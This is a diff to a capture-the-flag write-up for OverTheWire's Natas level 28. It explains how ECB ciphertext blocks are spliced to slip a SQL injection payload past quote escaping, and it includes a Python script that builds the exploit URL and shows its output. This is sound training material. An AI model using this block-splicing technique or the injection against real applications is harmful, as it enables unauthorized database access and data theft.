@@ -140,9 +140,41 @@ From an trial & error about the size of the input, it turns out that the origina
 * First 6 characters in the block of the input I concluded that if you enter 10 characters and see result, then 11 characters and see result, you immediately see that **the block is the same** the second time. And if the size is 16, then before the input there were 6. <br />
 * If the input to the quary is of size 0, then the fifth (and last) block has 4 bytes and then padding. This is true because when the input is size 12 there are still 5 blocks, and if the input is size 13 there are already 6 blocks.
 
-Therefore, you have to be careful about the 4 bytes that go into the user's block, and you also have to be aware of the fact that each added character moves all the ones that come in line.
+Therefore, you have to be careful about the 6 bytes that go into the user's block, and you also have to be aware of the fact that each added character moves all the ones that come in line.
 
+Back to our experiment:
+1. We would like to inject a block that begins with the character `'` (that is, the last character in the previous block is `\`)
+2. It is forbidden to omit the 6 bytes pushed to the user's block.
 
+and hence:<br />
+The input `*********' or 1=1-- -` will give us:<br />
+![](9.png)
+
+The input `**********` will give us: <br />
+![](10.png)
+
+Let's put them together and see what we got:
+
+```python
+from urllib.parse import quote
+from base64 import b64encode
+
+fixed_bytes = "1be82511a7ba5bfd578c0eef466db59c dc84728fdcf89d93751d10a7c75c8cf2"
+Keeps_6_bytes = "60a227d6fb6eddec61d83de2500edd76"
+user_input_and_the_rest = "7ec495538e8b79cb720f5dd46fc8a81c 41c098c4bacdc5ed9357564e5105dd7e 64d0dcc868253692adfcbd3796d1bf8a"
+
+q = (fixed_bytes + Keeps_6_bytes + user_input_and_the_rest).replace(' ', '')
+
+print('http://natas28.natas.labs.overthewire.org/search.php/?query=' + quote(b64encode(bytes.fromhex(q))))
+
+# Output:
+# http://natas28.natas.labs.overthewire.org/search.php/?query=G%2BglEae6W/1XjA7vRm21nNyEco/c%2BJ2TdR0Qp8dcjPJgoifW%2B27d7GHYPeJQDt12fsSVU46LectyD13Ub8ioHEHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BK
+```
+
+![](11.png)
+
+It worked!!
+We can now perform any sql injection we want!
 
 ## Password for the next level:
 ```
